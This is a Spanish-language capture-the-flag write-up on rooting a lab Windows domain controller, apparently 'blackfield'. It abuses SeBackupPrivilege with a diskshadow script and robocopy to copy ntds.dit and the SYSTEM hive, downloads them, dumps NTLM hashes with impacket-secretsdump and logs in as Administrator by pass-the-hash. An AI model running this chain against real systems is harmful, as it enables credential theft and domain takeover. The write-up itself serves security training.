## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd C:\Users\Administrator
dir
cd Desktop
dir
type root.txt
whoami /priv
```

No podemos todavia leer el **root.txt**, pero tiene un privilegio muy interesante que es el privilegio **SeBackupPrivilege**.
Teniendo este privilegio, podriamos hacer una copia (backup) de seguridad de elemento del systema como el **NTDS** que nos permitirian
recuperar los hashes de los usuarios del systema, entre ellos el usuario Administrator.

```bash
cd C:\
mkdir Temp
cd Temp
reg save HKLM\system system
```

Aqui hacemos una copia del systema que es necesario para posteriormente dumpear los hashes NTLM del fichero `ntds.dit`. Intentamos copiar 
el fichero `ntds.dit`

```bash
copy C:\Windows\NTDS\ntds.dit ntds.dit
#Output
PermissionDenied!
```

Teniendo este privilegio y siguiendo la guia de la web [pentestlab](https://pentestlab.blog/tag/diskshadow/) podemos tirando de robocopy en vez de
copy, copiarnos este fichero. Creamos un fichero llamado example.txt y le ponemos los comandos siguientes.

```bash
set context persistent nowriters 
add volume c: alias savialias 
create 
expose %savialias% z:
```

> [ ! ] NOTAS: Hay que tener cuidado con estos ficheros que enviamos en maquinas windows de siempre poner un espacio al final de cada linia para evitar problemas

```bash
dos2unix example.txt
```

y desde la maquina victima, subimos el fichero

```bash
upload example.txt
diskshadow.exe /s example.txt
```

Ya podemos ver que en Z:\ hay el mismo contenido que en C:\ y si tratamos de copiar el fichero ntds.dit con el comando `copy z:\Windows\NTDS\ntds.dit ntds.dit` 
nos arastra el mismo error. Pero usando del comando robocopy esto funcciona sin problemas.

```bash
robocopy z:\Windows\NTDS . ntds.dit
download ntds.dit
download system
```

> [ ! ] NOTAS: Si el download no funcciona, siempre podemos tratar de montar un directorio compartido a nivel de red con `impacket-smbfolder`

Ya podemos dumpear el ntds con `impacket-secretsdump`

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

Ya podemos ver todos los hashes de los usuarios activos del systema.

```bash
crackmapexec winrm 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
```

Pwn3d!!!!


```bash
evil-winrm -i 10.10.10.192 -u 'Administrator' -H 194fb5e5179499be6424d4cd53b99e
whoami 
#Output
blackfield\administrator
```

Aqui hemos rooteado la maquina y podemos leer la flag.
